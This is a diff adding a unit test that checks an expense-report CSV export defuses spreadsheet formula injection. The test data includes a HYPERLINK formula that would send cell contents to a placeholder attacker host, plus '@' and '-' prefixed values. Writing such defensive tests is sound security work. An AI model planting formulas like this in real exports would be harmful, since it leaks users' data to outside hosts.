@@ -70,3 +70,18 @@ describe('reports/expense-doc', () => {
     expect(doc._latin1('Café – ‘ok’ ‡ → 東京 — end')).toBe('Café – ‘ok’ ‡ to ?? — end');
   });
 });
+
+// A cell that starts with = + - @ is a formula to Excel, quoted or not, and
+// merchants and purposes come from receipts and from people.
+describe('reports/expense-doc — CSV formula injection', () => {
+  test('text that would be a formula is neutralised; numbers keep their sign', () => {
+    const evil = { ...payload, lines: [{ ...payload.lines[3], merchant: '=HYPERLINK("https://evil.example/?x="&A1,"Click")', purpose: '@SUM(1+1)', description: '-cmd' }] };
+    const csv = doc.expenseReportCsv(evil);
+    const row = csv.split('\n')[1];
+    expect(row).toContain(`"'=HYPERLINK(""https://evil.example/?x=""&A1,""Click"")"`);
+    expect(row).toContain("'@SUM(1+1)");
+    expect(row).toContain("'-cmd");
+    expect(row).not.toMatch(/,=|,"=/);
+    expect(row).toContain(',18.40,');
+  });
+});
